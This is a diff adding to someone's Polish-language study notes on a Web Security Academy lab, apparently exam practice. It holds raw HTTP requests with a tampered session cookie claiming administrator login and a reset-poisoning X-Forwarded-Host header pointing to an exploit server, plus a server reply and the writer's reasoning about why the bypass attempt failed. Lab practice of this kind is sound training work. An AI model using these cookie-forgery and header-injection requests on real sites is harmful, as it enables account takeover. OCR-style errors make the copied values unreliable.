@@ -274,6 +274,16 @@ X-Forwarded-Host : exploit-Oa5c00d9047f1d7283dd5e3a01590082. exploit-server.net
 200
 
 Maszynka B stage2: ciasteczko islogged - poleglam
+znalesc fraze islogged: py-us3r.github.io/bscp-roadmap-bscproadmap/#
+Ważna obserwacja: mimo isloggedin:true w cookie, serwer i tak sprawdza code i odpowiada "invalid
+code" - czyli walidacja kodu w /refresh_password jest niezależna od tego co wysyłasz w cookie. To
+dobrze, ale test zrobiłas na złym endpoincie - /refresh_password i tak zawsze będzie chciało
+poprawnego kodu, niezależnie od cookie.
+
+Właściwy test bypassu: użyj tego samego sfałszowanego cookie (isloggedin:true, username:carlos,
+oryginalny podpis) ale na innym endpoincie - takim co normalnie wymaga zalogowania - nie przetestowane?
+
+
 
 GET /my-account ?id=carlos HTTP/2
 Host : Oae6001c04191df583de5fla00f700b4.web-security-academy. net
@@ -297,6 +307,86 @@ Sec-Fetch-Dest : document
 Referer: https://exploit-Oa5c00d9047f1d7283dd5e3a01590082.exploit-server.net/
 Accept -Encoding: gzip, deflate, br
 Priority: u=0, i
+
+
+
+
+POST /admin_controls HTTP/2
+Host: Oae6001c04191df583de5fla00f700b4.web-security-academy. net
+Cookie:session=
+%7b%22username%22%3a%22administ rat or%22%2c%22isloggedin%22%3afal se% 7d - -MCsCEy OqwGbOfzCj 8TYi9t D55r X1 SLQCFHZ
+ZZzGJ80%2b ZK5FG02nwvh%2bl Qlpb
+Content-Length: 74
+Cache-Control : max-age=0
+Sec-Ch-Ua: "Not-A. Brand" ; v="24", "Chromium" ; v="146"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Linux"
+Accept -Language : en-US, en; q=0.9
+Origin: https://Oae600lc04191df583de5fla00f700b4.web-security-academy.net
+Content -Type: application/x-www-form-urlencoded
+Upgrade-Insecure-Requests: 1
+User-Agent : Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0
+Safari/537.36
+Accept :
+text/html,application/xhtml+xml,application/xml; q=0.9,image/avif,image/webp,image/apng,*/ *; q=0.8, applicati
+on/signed-exchange; v=b3; q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User : ?1
+Sec-Fetch-Dest : document
+Referer: https://Oae600lc04191df583de5fla00f700b4.web-security-academy.net/refresh_password
+Accept-Encoding: gzip, deflate, br
+Priority: u=0, i
+
+csrf=G4Zst X2gwRt uSAMJS2JVKWhBoot fNYue&password=null&username=administator
+
+
+
+HTTP/2 200 OK
+Content -Type: text/html; charset=utf-8
+Cache-Control : no-cache
+X-Frame-Options: SAMEORIGIN
+Content-Length: 3963
+
+</p>
+<a href="/my-account ">
+My account (<span class='user-level -normal ' >
+administrator
+</span>
+
+</p>
+</section>
+</header>
+<header class="notification-header">
+</header>
+
+Please check your email for a code and enter it below.
+
+<form name=forgot -password-code class=login-form method=POST>
+<input required type="hidden" name="csrf" value="G4Zst X2gwRt uSAMJS2JVKWhBoot fNYue">
+<label>
+Code
+</label>
+<input required type=text name=code>
+<label>
+New password
+</label>
+<input required type=password name=password>
+<button class=button type=submit>
+Submit
+</button>
+</form>
+</div>
+</section>
+div class="footer-wrapper">
+
+
+
+
+
+
+
+
 
 
 
